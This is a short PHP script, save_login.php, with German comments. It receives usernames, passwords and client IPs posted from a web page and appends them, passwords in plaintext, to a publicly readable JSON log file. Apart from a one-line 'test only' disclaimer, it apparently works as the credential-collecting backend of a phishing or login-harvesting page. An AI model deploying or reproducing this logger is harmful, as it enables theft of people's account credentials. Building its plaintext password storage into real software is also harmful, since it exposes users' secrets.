<?php
// save_login.php

// Wir erlauben den Zugriff (falls nötig) und setzen den Inhaltstyp auf JSON
header('Content-Type: application/json');

// 1. Daten empfangen, die vom JavaScript geschickt wurden
$inputJSON = file_get_contents('php://input');
$inputData = json_decode($inputJSON, true);

// Prüfen, ob Daten da sind
if (!empty($inputData)) {
    
    // 2. Wir fügen die "echte" IP vom Server hinzu (zuverlässiger als Client-IP)
    // Falls du die IPify-Adresse aus dem JS willst, ist sie schon in $inputData['ip']
    $serverIP = $_SERVER['REMOTE_ADDR']; 

    // Das neue Eintrag-Objekt (Dictionary)
    $neuerEintrag = [
        'zeitstempel' => date('Y-m-d H:i:s'),
        'ip_vom_server' => $serverIP,
        'ip_vom_client' => $inputData['ip'] ?? 'Unbekannt',
        'username' => $inputData['username'],
        'password' => $inputData['password'] // ACHTUNG: Nur zu Testzwecken!
    ];

    // 3. Die bestehende Datei laden (falls vorhanden)
    $dateiName = 'login_logs.json';
    $aktuelleDaten = [];

    if (file_exists($dateiName)) {
        $jsonInhalt = file_get_contents($dateiName);
        $aktuelleDaten = json_decode($jsonInhalt, true);
        if (!is_array($aktuelleDaten)) {
            $aktuelleDaten = [];
        }
    }

    // 4. Neuen Eintrag hinzufügen
    $aktuelleDaten[] = $neuerEintrag;

    // 5. Alles wieder speichern
    file_put_contents($dateiName, json_encode($aktuelleDaten, JSON_PRETTY_PRINT));

    // Erfolgsmeldung zurückgeben
    echo json_encode(["status" => "success", "message" => "Gespeichert"]);
} else {
    echo json_encode(["status" => "error", "message" => "Keine Daten empfangen"]);
}
?>